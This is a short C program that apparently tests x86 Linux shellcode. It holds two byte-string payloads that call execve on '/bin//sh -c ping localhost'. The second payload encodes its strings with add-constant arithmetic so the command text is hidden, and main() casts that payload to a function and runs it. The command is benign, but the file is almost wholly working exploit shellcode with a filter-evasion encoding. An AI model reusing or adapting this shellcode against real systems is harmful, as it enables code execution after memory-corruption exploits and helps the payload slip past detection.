#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x68\x73\x74\x20\x20\x68\x61\x6c\x68\x6f\x68\x20\x6c\x6f\x63\x68\x70\x69\x6e\x67\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80"




;

unsigned char code2[] = \
"\x6a\x0b\x58\x99\x52\xbe\x63\x64\x10\x10\x81\xc6\x10\x10\x10\x10\x89\x74\x24\xfc\xbe\x50\x5b\x57\x5e\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xf8\xbe\x10\x6b\x6e\x62\x81\xc6\x10\x01\x01\x01\x89\x74\x24\xf4\xbe\x60\x58\x5d\x56\x81\xc6\x10\x11\x11\x11\x89\x74\x24\xf0\x83\xec\x10\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\xbf\x1e\x1e\x62\x57\x81\xc7\x11\x11\x11\x11\x89\x7c\x24\xfc\xbf\x1f\x61\x58\x5e\x81\xc7\x10\x01\x11\x10\x89\x7c\x24\xf8\x83\xec\x08\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80"



;

int main()
{
printf("Shellcode Length:  %d\n", strlen(code));
printf("Shellcode2 Length:  %d\n", strlen(code2));
int (*ret)() = (int(*)())code2;
ret();
}